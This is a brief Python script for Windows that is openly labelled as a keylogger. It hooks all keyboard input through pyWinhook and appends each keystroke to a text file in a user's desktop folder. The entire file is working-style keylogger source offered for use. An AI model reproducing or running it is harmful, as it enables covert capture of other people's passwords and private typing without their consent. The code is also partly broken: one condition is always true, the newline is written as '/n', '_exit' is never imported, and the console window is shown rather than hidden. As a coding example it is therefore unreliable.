
# Python code for keylogger 
# to be used in windows 
import win32api 
import win32console 
import win32gui 
import pythoncom, pyWinhook 
  
win = win32console.GetConsoleWindow() 
win32gui.ShowWindow(win, 1) 
  
def OnKeyboardEvent(event): 
    if event.Ascii==5: 
        _exit(1) 
    if event.Ascii !=0 or 8:  
        f = open("C:/Users/Sneden/Desktop/onlygodknows/output.txt", 'r+') 
        buffer = f.read() 
        f.close() 
        f = open("C:/Users/Sneden/Desktop/onlygodknows/output.txt", 'w') 
        keylogs = chr(event.Ascii) 
        if event.Ascii == 13: 
            keylogs = '/n'
        buffer += keylogs 
        f.write(buffer) 
        f.close() 
# create a hook manager object 
hm = pyWinhook.HookManager() 
hm.KeyDown = OnKeyboardEvent 
# set the hook 
hm.HookKeyboard() 
# wait forever 
pythoncom.PumpMessages() 
